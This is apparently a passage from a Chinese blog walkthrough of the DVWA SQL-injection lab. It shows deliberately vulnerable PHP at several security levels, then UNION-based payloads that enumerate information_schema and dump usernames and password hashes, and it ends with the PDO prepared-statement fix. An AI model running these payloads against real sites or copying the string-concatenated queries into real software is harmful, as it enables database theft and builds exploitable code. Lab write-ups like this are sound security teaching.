    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

从源代码中可以很清晰的看到这里存在字符型SQL注入漏洞。但是如果不看源代码，依然可以判别出SQL注入的类型：

输入`1' #`（`#`为SQL的注释符，有些情况下为`--`），若正常返回结果则为字符型，若报错则为数字型。
其原理，将其代入查询语句很容易看出来：

字符型：<code>SELECT first_name, last_name FROM users WHERE user_id = '<b style="color:red">1' #</b>';</code>
数字型：<code>SELECT first_name, last_name FROM users WHERE user_id = <b style="color:red">1' #</b>;</code>

可以看见，字符型的在输入之后，原本的单引号右部被注释掉了，所以输入中的单引号又恰好补全了这对引号，所以会返回结果；
数字型的在输入之后，由于本身没有引号包含住输入，所以输入里的那个单引号无法成对，所以会报语法错误。

若网页设置报错信息不显示的话，还可以使用`and`语句、`or`语句、加减法（仅数字型）来判断是否存在注入：
- `and`语句：
   <code>SELECT first_name, last_name FROM users WHERE user_id = '<b style="color:red">1' and 1=1#</b>';</code>（返回一条记录）
   <code>SELECT first_name, last_name FROM users WHERE user_id = '<b style="color:red">1' and 1=2#</b>';</code>（不返回记录）
- `or`语句：
   <code>SELECT first_name, last_name FROM users WHERE user_id = '<b style="color:red">1' or 1=1#</b>';</code>（返回所有记录）
- 加减法：
   <code>SELECT first_name, last_name FROM users WHERE user_id = <b style="color:red">1+1</b>;</code>（返回id为2的记录）
   <code>SELECT first_name, last_name FROM users WHERE user_id = <b style="color:red">3-1</b>;</code>（返回id为2的记录）

确认了存在注入之后，就可以开始获取我们想要的数据了。这里重点用到了SQL的[`ORDER BY`](https://www.w3school.com.cn/sql/sql_union.asp)关键字和[`UNION`](https://www.w3school.com.cn/sql/sql_orderby.asp)运算符。`ORDER BY`用于给结果按照某列排序，后面跟一个列名或列索引；`UNION`用于合并多次查询的结果，要求是每次查询的列数要一致。所以我们可以利用`UNION`来查询我们想要的数据，而在此之前，需要得到当前查询语句选取的列数。

而上面说的`ORDER BY`若是后面跟的索引超出了选择的列数值，会返回错误；UNION若后面跟的查询语句选择的列数与原语句不一致也会报错。下面就根据这两个特性获得选择的列数：

![](https://hujiekang.top/images/uploads/big/0eb47c2d8af51532dffca836e33cc5d7.gif)
![](https://hujiekang.top/images/uploads/big/a77964b23cf2c386134c832a18ecfa8c.gif)

根据显示的结果，可以得出选择的列数为2列。
接下来就可以查询其他的信息了：

首先查询当前数据库名和用户名：`id=1' union select database(),user()#`

![](https://hujiekang.top/images/uploads/big/6362b5f425c08a735e404dd5ca96eb0e.png)

要想获取远程数据库的表、列，就要访问专门保存描述各种数据库结构的表。通常将这些结构描述信息称为元数据。在MySQL中，这些表都保存在`information_schema`数据库中。

1. 查询所有数据库名称（`information_schema`数据库下的`schemata`数据表中的`schema_name`列）：
   `id=1' union select null,schema_name from information_schema.schemata#`

   ![](https://hujiekang.top/images/uploads/big/dc132527a2c3c39f6a0b87c3984e8232.png)

2. 查询当前数据库下的所有数据表名称（`information_schema`数据库下的`tables`数据表中的`table_name`列）：
   `id=1' union select null,table_name from information_schema.tables where table_schema=database()#`

   ![](https://hujiekang.top/images/uploads/big/c34329fbbce59345606c63d7689014e4.png)

3. 获取数据表下所有列名称（`information_schema`数据库下的`columns`数据表中的`column_name`列）：
   `id=1' union select null,column_name from information_schema.columns where table_schema=database() and table_name='users'#`

   ![](https://hujiekang.top/images/uploads/big/56553a3da67289461cb41d400894fc00.png)

4. 获取数据：
   `id=1' union select user,password from users#`

   ![](https://hujiekang.top/images/uploads/big/7582a38e54a78c0a35fa180e0f2ad263.png)

至此，数据已经顺利拿到。
在某些场景中，页面可能限制了单次显示的数据条数，此时可用`group_concat()`函数来实现在一条记录里展示多个结果：

![](https://hujiekang.top/images/uploads/big/679425014669ca177d4ba840dd582732.png)

## 安全等级`Medium`

`Medium`将输入框改为了下拉单选框，参数改为POST传输，而且使用[`mysqli_real_escape_string()`](https://www.runoob.com/php/func-mysqli-real-escape-string.html)对特殊字符（`NUL`（ASCII 0）、`\n`、`\r`、`\`、`'`、`"` 和 `Control-Z`）进行了转义。这就意味着需要抓包修改参数，而且引号不能被使用。

![](https://hujiekang.top/images/uploads/big/0bb82af808605cede1c5faacaa209e52.png)

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

首先确定注入类型为数字型：

![](https://hujiekang.top/images/uploads/big/dd9435864bfa25740b5557cb36650964.gif)

之后的步骤基本和`Low`一致，但是由于引号不能被使用，所以在获取数据列的时候需要将数据表名用16进制表示，以避免引号的使用：

![](https://hujiekang.top/images/uploads/big/56db2a66ea78c5327d0b21c42be171e0.png)

## 安全等级`High`

`High`等级的查询提交页面与查询结果显示页面不是同一个，也没有执行`302`跳转，这样做的目的是为了防止一般的`sqlmap`注入，因为`sqlmap`在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。

```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

但是手工注入的步骤和`Low`等级一致，放一张结果图：

![](https://hujiekang.top/images/uploads/big/e9de83cc212d1bfa65924ce99ffbd35a.gif)

## 安全等级`Impossible`

`Impossible`使用了SQL注入的最终解决方案：[PDO（PHP 数据对象）](https://www.runoob.com/php/php-pdo.html)，严格的将数据和代码分开，将输入的内容全部认为是数据，这样就不存在注入了。

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

SQL注入相关文章：
<https://bbs.ichunqiu.com/thread-9518-1-1.html>
<http://bbs.ichunqiu.com/thread-9668-1-1.html>
<http://bbs.ichunqiu.com/thread-10093-1-1.html>
<https://www.freebuf.com/articles/web/120747.html>
